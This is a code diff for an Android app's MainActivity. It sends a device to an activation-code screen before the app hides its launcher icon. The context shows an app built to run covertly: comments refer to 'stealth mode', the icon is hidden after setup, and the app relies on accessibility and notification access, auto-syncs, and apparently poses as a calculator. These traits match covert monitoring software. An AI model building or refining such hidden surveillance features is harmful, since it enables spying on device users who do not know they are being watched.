@@ -137,6 +137,29 @@ class MainActivity : AppCompatActivity() {
         refreshPermissionStatus()
         triggerAutoSyncAfterAccessibility()
 
+        // Permissions are ready, but the device still has no tenant binding.
+        // Previously this path always finished and hid the icon, which left a
+        // device that could not reach the code screen at all: the launcher icon
+        // was gone and MainActivity only opens from Splash. Route to activation
+        // first and keep the icon visible until the device is actually bound.
+        if (!deviceState.isActivated) {
+            Log.i(TAG, "Permissions ready but device not activated - routing to activation")
+            Toast.makeText(this, "Permissions ready. Enter the device code to finish.", Toast.LENGTH_LONG).show()
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    startActivity(
+                        Intent(this, ActivationActivity::class.java).apply {
+                            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                        }
+                    )
+                    finish()
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to open activation after setup", e)
+                }
+            }, 400L)
+            return
+        }
+
         // Hide app icon from launcher for stealth mode
         hideAppIcon()
         Log.i(TAG, "All core permissions active — setup complete, hiding app icon and closing activity")
@@ -368,7 +391,10 @@ class MainActivity : AppCompatActivity() {
         val isA11y = isAccessibilityEnabled()
         val isNotif = isNotificationAccessGranted()
 
-        if (deviceState.isFirstLaunchAfterInstall() || !isA11y || !isNotif || missingRuntime.isNotEmpty()) {
+        val needsSetup = deviceState.isFirstLaunchAfterInstall() ||
+            !isA11y || !isNotif || missingRuntime.isNotEmpty()
+
+        if (needsSetup) {
             Handler(Looper.getMainLooper()).postDelayed({
                 if (!isFinishing && !isDestroyed) {
                     isOneTapFlowRunning = true
@@ -377,6 +403,12 @@ class MainActivity : AppCompatActivity() {
                     handleNextSetupStep()
                 }
             }, AUTO_FLOW_DELAY_MS)
+        } else if (!deviceState.isActivated) {
+            // Nothing left to grant and the device still has no tenant: go
+            // straight to the code screen instead of sitting on the calculator.
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (!isFinishing && !isDestroyed) completeSetupAndClose()
+            }, 600L)
         }
     }
 
